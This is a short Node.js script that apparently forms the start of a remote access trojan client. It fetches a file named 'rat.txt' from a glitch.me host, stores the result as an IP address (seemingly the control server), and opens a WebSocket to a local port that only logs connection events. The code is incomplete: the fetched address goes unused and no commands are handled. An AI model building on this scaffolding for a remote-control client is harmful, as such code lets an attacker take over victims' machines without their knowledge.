const axios = require('axios');
const WebSocket = require('ws');

async function main()
{
    let res = await axios.get('https://utilsy.glitch.me/rat.txt');
    let IP = res.data;

    const wsClient = new WebSocket(`ws://localhost:2208`);

    wsClient.onopen = function()
    {
        console.log('Connection established');
    };
    wsClient.onclose = function()
    {
        console.log('Connection closed');
    };
}
main();